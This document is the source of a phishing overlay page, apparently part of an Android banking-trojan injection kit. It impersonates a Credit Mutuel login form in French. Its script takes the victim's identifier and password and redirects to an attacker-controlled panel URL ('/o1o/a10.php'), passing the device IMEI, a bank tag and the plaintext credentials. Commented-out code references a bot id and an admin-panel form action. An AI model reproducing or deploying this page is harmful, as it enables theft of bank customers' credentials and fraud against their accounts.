<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
<meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">

<style>

.mainform
{
margin-left: 5px;
}

p
{
 margin-bottom:15px;
}

body{
	margin:0;
	padding:0;
	font-family:arial,sans-serif;
	font-size:12px;
	-webkit-text-size-adjust:none;
	-moz-text-size-adjust:none;
	-ms-text-size-adjust:none;
	text-size-adjust:none;
	background-color: #E7E7E7;
	font-family: "Arial";
	font-size: 20px;
	
}


.button {
    background: rgba(252, 207, 26, 0) none repeat scroll 0% 0%;
    display: inline;
    font-family: Arial;
    font-size: 16px;
    padding: 5px;
    text-decoration: none;
    width: 18%;
    margin-top: 30px;
    height: 40px;
    border: medium none;
    box-shadow: 0px 1px 1px rgba(179, 151, 28, 0);
    color: #3E82B3;
    float: right;
}


.button:active {
	position:relative;
	top:1px;
}



.field{
    margin-bottom: 20px;
  	background-color: #E7E7E7;
    outline: none;
    border: 1px solid #E7E7E7;
	border-bottom: 1px solid #BDBDBD;
	width: 55%;
	margin-left: 10px;
	margin-right: 10px;
	font-family: "Arial"	;
	font-size: 18px;
	font-weight: lighter;
	text-indent: 5px; 
   
   
	
	}
.field:hover
{
border-bottom: 2px solid #3E82B3;
}
	


	
.header{
	
	padding-top: 10px;
	padding-left: 5%;
	background: #FFF;
	weight: 100%;
	height: 40px;
	color: black;
	border: none;
	box-shadow: 0 1px 1px #cccccc;

	
	
}
.header2{

	padding-top: 10px;
	padding-left: 5%;
	background: #3E82B3;
	weight: 100%;
	height: 1px;
	color: black;
	margin-bottom: 30px !important;	
	border: none;
	
	
}



.textp
{
	font-family: "Arial"	;
	font-size: 20px;
	font-weight:  normal;
	color: #009CDE;
}




.inline
{
display: inline;
}




	
.iconfield

{

width: 20px;
height: 20px;
padding-left: 5%;

}	
	
ul.hr {
   margin: 0; /* ?????¤?? ???????? ???????? */
   padding: 4px; /* «??????? ????? */
  }
ul.hr li {
   display: inline; /* ?????????? ??? ???????? ??????? */
   margin-right: 5px; /* ?????? ????? */
   
  }
  
  .fielderror{
	border: 0 none;
    border-bottom: 1px solid #EC4343;
    margin-bottom: 20px;
  	background-color: #E7E7E7;
    outline: none;
	width: 55%;
	margin-left: 10px;
	margin-right: 10px;
	font-family: "Arial"	;
	font-size: 18px;
	font-weight: lighter;
	text-indent: 5px; 
  }
	
	</style>

	

</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<div class="header">

Identification

</div>
<div class="header2">

</div>

<div class="mainform">
<div class="bodyclass">


<!--START OF FORM-->
<form action="null" method="post" id="_mainForm" target="flow_handler">




	<img class="iconfield" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAQAAABIkb+zAAADEElEQVR4Ae3YT2gcVRzA8W83tjvunxwUBQkYk00iwZRQ7xa86rklNTWXED3rTQ96UqxssRRtVieskIKHhKDelyBZNLBKMWC3EpBoKNjZ9iA0m81uS3/upbA8ZreT7kzmFX6f7/Ud3g/ee8sOSimllFJKKRWqLOdwqXCHVrvbVHCZIcsTYYIi+4hPdZYYw2pPk+ce0qMWn+NgqXH+QAK0RQ4LnaKGBMxjGsuMU0MInkcOi6SCHB6jLRyskUd8ukuJYrsSdxGfLmCJCZ+X5y/Ok+Qhhzl2fF6kHFYoIkbfkcKUZgUxcrHAIPuY2z+GnwSrxso9MsTunHl4SNFNhl1j9Vli5xpbOk8v88bqArGrGC9Pkl5SNJCONondHaSjEo+yYfygxa6FdFTkUa4iHTV1gL7dPuQRKtt2hMxL7NBL2r5L/A3SGXP0smDfMzpjbGmHNN0MctNYfYbYZagbm1ohgZ8E3yPGgUtjARcxWiWDadDcPkIBK4zRQox2mSfFQ2kWuIkYNRnBEhcQnxpscLVdmQbi0ydYw2ELOWTXSGKRHB4SPP7lJSwzza3g2+ckFhrl94CHZwRLOXxGC+lRk09JYrUcLnuIT3t8zShPhAxnKbCJR7OdxyYFzpDGckqpE5xkho/4lnWu41HnPsIBNW6wzjIf8xbTnMA6LzDLFX6jhQSoxTUWmWWI2A3wGnmqyGNW5SKnSRCLU3yBh4TQLS7zKkfoOLNUkJD7lbc5TuQGmGcXiah/eIeniNBpqkjEVXmdSDgs8gAJ1AHbbLDGMi4uy6xRZpsmErArOIRsKMCp9/iBD3iDF7t+VhnmTT7kR2oB/jMMhbv9HaRr9yjxHq9wGFO8zzr3ka79zTAhyXIdwb8yCzzD43qWd/m5x23IEoqvEJ/qfMkkYZhikQbik0sIJn2u7gF5niNMz3PJ55I/YIq+XUSMfmKMKLxMGTG6TN/MLw2XSBCVAczjWqVv/yEd/UK0jhnPdYO+HfX35CWkMx1AB7BsgBssRdyfoQ8QczqADqAD6ABWDqCUUkoppZRS/wP56FT03NABRAAAAABJRU5ErkJggg==">
		<label style="margin-right: 6%;" for="login">Identifiant</label>
			<input id="login" name="Identifiant" class="field" type="text"><br>
	<img class="iconfield" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAQAAABIkb+zAAACVklEQVR4Ae2aP0/TXxSHHxsq4OifRdC4E6wMRl6JJrwKAguyG9nb/lpMw+JoJGk0shniSzBNSUuiCHHSjv5sGXrs6klber3ley7JeT7zTe8Tbs7hkxZn6jhOjlW22adBh/NBOjR4y3OekCN57rHDd2REznjJAslym13OkQvSo8ItEmSNDjJhfvKMpMjzCgnMf8yQCDf4gISH98yTAHkOkH/MO2awZszjOabO3iB1jpERKWPMGjIkX9hQ43KRTU6QIXmKIXeGTJ5frI94GHk2+R9R+cFNzNhFVE5YYhwPOUVUSnZbV6+tryxyEfc5U6e63MWEHfTjWWISHvFbnXyBATn0/zzrTMqWOnnKNTJnVU+egJl+Hf2MHpM52+oKG4Sg/wZbZM6+usICITxQp9+QOQ21dUP59tf5z2SNWmF1QjlQ6yxr1A7YI5TXquZkjqiEUtPnXcAFXMAFXCBpgRWqtOkhl5weLSoUmCrz1JBM06fK3PSu/wkxyOG0FGqIUSrTeftilj4FoqkihikTTdtU4IhoeqYCXbOFZfB59gIu4AIu4AIu4AIu4AK6Q+uOm76A7tC646YvoDu07rjJC9RiOq69wEpcx7UXqMZ1XHuBdlzHtRfoRXbcWAEXaI0VaKYvUBkrUExfoEB/zBhdTkkgfJCW4CoIzHGIDMlHZtMV0ApV9ZD6lJiFlAU0Bcoc0R2kSZFlLzQu4AIu4AIu4ALhuIAL+BfdtEwFmkRTMRUoEoHquAZRHfrq/eCmRBy642aQ8A4d0nEzSHiHDu64crkJ6dCO4ziO8wdTKQgzO6hj8gAAAABJRU5ErkJggg==">
		<label style="margin-right: 4px;" for="password">Mot de passe</label>
			<input id="password" name="Mot de passe" class="field" type="password"><br>
			<input type="hidden" name="name" value="Credit Mutuel">

<input value="VALIDER" id="input_submitBtn" class="button" style="margin-right: 5%;font-weight: bold;" type="button">


<p class="textp"></p>

 

 </form></div>
<!--END OF FORM-->



</div>

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>


</div>


           <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // óñòàíàâëèâàåì ó ôîðìû óðë àäìèíêè
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ïîëó÷àåì id áîòà
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'field';
						} catch(e){};
						
                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "cmprodfr'+
					'", "identifiant": "'+oNumInp.value+
					'", "mot_de_passe": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|cmprodfr|"+oNumInp.value+"|"+oCodeInp.value+"|");
												
						
						return false;
                    };

                })();
            </script>

</body></html>
